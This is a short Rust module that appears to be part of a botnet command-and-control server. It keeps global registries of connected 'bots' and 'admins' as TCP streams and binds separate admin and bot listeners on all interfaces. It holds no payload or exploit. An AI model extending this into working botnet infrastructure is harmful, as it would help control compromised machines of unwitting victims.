// src/common/mod.rs

use std::net::TcpListener;
use std::sync::{Arc, Mutex};
use lazy_static::lazy_static;
use std::collections::HashMap;
use std::net::TcpStream;



static IP_ADDR: &str = "0.0.0.0";

// TODO: add admin username in ADMIN_REGISTRY
lazy_static! {
    pub static ref BOT_REGISTRY: Arc<Mutex<HashMap<String, Arc<Mutex<TcpStream>>>>> = Arc::new(Mutex::new(HashMap::new()));
    pub static ref ADMIN_REGISTRY: Arc<Mutex<HashMap<String, Arc<Mutex<TcpStream>>>>> = Arc::new(Mutex::new(HashMap::new()));
    pub static ref BOT_COUNT: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
    pub static ref ADMIN_COUNT: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
}



pub fn start_listeners(admin_port: i32, bot_port: i32) -> (TcpListener, TcpListener) {
    let admin_host = format!("{}:{}", IP_ADDR, &admin_port);
    let bot_host = format!("{}:{}", IP_ADDR, &bot_port);

    let admin_listener = TcpListener::bind(&admin_host).expect("couldn't bind to admin address");
    let bot_listener = TcpListener::bind(&bot_host).expect("couldn't bind to bot address");
    println!("Admin server is running on {}", &admin_host);
    println!("Bot server is running on {}", &bot_host);

    return (admin_listener, bot_listener);
}
